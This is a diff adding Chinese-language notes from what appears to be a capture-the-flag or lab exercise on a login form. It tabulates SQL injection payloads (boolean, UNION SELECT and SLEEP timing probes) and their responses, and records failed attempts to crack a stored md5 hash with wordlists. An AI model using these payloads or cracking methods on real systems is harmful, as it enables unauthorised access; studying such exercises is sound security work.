@@ -153,3 +153,27 @@ password    -> 7d39307ae824e70052c0aa16816a9b16   (32 hex)
   `x' UNION SELECT SLEEP(3) -- -` 有 3s 延迟返回 `password` → 注入点确实只影响「用户是否存在」这条查询；
   密码比对发生在应用层（或另一条不可注入的查询），改不了。
 - 该哈希在 md5.gromweb.com（8.3 亿条）查不到，常见 50 万口令 + 规则变形也未命中。
+
+## 补充：2026-10-28（round-5）——密码比对不在 SQL 里，UNION 无效
+
+- 新实例仍是同一个 md5：`7d39307ae824e70052c0aa16816a9b16`（静态预置）。
+- 关键实验（`username` 注入 + 已知 password）：
+
+| username | password | 响应 |
+| --- | --- | --- |
+| `admin` | 任意 | `password`（用户存在、口令错） |
+| `admin' AND 1=1 -- -` | x | `password` |
+| `admin' AND 1=2 -- -` | x | `username` |
+| `x' UNION SELECT '<md5(input)>' -- -` | input | `password`（**仍失败**） |
+| `x' UNION SELECT '<bcrypt(input)>' -- -` | input | `password` |
+| `x' UNION SELECT '<明文>' -- -` | 明文 | `password` |
+| `x' UNION SELECT 0x<md5> -- -` | input | `password` |
+
+结论：`username` 只用于「查用户是否存在」，**口令比对发生在应用层且不读注入的行**
+（可能是独立的、参数化的第二次查询，或硬编码常量比对）。因此 SQLi 只能确认用户存在，
+无法伪造登录。
+
+- 用 rockyou（14,344,392 条）、100 万常用口令 + 大小写/后缀/年份变形、
+  `md5(md5(x))`/`md5(sha1(x))`、以及以 payroll/paybuddies/admin 为词根的 1.1 万组合
+  全部未命中 → 明文大概率是随机串。
+- 结论：本题在当前实例上无法通过「注入伪造」或「口令破解」完成。
